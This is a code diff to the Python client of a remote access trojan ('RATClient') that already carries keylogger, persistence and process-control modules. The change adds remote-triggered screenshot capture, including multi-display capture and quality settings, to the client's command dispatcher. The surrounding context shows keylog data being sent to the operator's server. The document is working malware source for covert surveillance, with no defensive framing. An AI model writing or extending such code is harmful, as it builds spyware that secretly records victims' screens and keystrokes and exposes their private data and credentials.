@@ -9,7 +9,7 @@ from persistence import PersistenceManager
 from protocol import Protocol
 from process_manager import ProcessManager
 from keylogger import Keylogger
-
+from screenshotManager import take_screenshot, ScreenshotManager
 
 
 
@@ -28,6 +28,8 @@ class RATClient:
         
         self.keylogger = Keylogger(self.encryptor, self.client_id, self.server_url)
         self.keylogger_enabled = False
+        
+        self.screenshot_manager = ScreenshotManager()
                 
 
 
@@ -171,6 +173,14 @@ class RATClient:
                     self.keylogger.send_logs_sync(self.keylogger.log_buffer.copy())
                     self.keylogger.log_buffer.clear()
                 result = {"message": "Keylog data sent to server"}
+            elif action == "take_screenshot":
+                quality = data.get('quality', 65)
+                multi_display = data.get('multi_display', False)
+                result = take_screenshot(quality=quality, multi_display=multi_display)
+            elif action == "screenshot_config":
+                quality = data.get('quality')
+                max_width = data.get('max_width')
+                result = self.screenshot_manager.update_config(quality, max_width)
             else:
                 result = {"error": f"Unknown process action: {action}"}
             
